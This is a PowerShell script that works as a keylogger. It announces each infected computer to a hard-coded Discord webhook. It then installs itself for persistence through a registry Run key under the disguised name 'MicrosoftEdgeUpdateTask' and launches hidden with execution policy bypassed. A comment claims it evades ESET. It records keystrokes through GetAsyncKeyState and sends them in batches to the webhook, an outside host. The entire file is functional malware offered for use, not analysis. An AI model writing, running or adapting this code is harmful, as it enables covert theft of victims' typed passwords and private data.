# Configuration
$W = "https://discord.com/api/webhooks/1348482615879139408/8WWmsASLCd2mVWVyInAUh0I_RprgBGRdWG1cDLWLptSvFtHwyJMetbIHQ_VfPdayeu_0"
$N = $env:COMPUTERNAME
$F = "$env:LOCALAPPDATA\win_sys_sync.ps1"

# 1. Immediate Handshake
try {
    $Init = @{username="GHOST_$N"; content="Target Online: $N - Persistence Initializing..."} | ConvertTo-Json
    Invoke-RestMethod -Uri $W -Method Post -Body $Init -ContentType "application/json"
} catch {}

# 2. Re-engineered Persistence (ESET Bypass)
$Logic = @"
`$W = '$W'; `$N = `$env:COMPUTERNAME; `$L = ''
Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);]}'
while(`$true){
    Start-Sleep -m 50
    for(`$i=8;`$i -le 190;`$i++){
        if([K]::GetAsyncKeyState(`$i) -eq -32767){
            `$k = [char]`$i
            if (`$k -eq '"') { `$k = "'" }
            if (`$k -eq '\') { `$k = "/" }
            `$L += `$k
            if (`$L.Length -ge 30) {
                `$P = @{username="GHOST_`$N"; content="[$N]: `$L"} | ConvertTo-Json
                try { Invoke-RestMethod -Uri `$W -Method Post -Body `$P -ContentType "application/json"; `$L = '' } catch { Start-Sleep -s 10 }
            }
        }
    }
}
"@

if (-not (Test-Path $F)) {
    $Logic | Out-File -FilePath $F -Encoding ascii -Force
    # Use a disguised name in the registry
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateTask" -Value "powershell.exe -W H -Exec Bypass -File `"$F`"" -PropertyType String -Force
}

# 3. Execution
Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$F`"" -WindowStyle Hidden
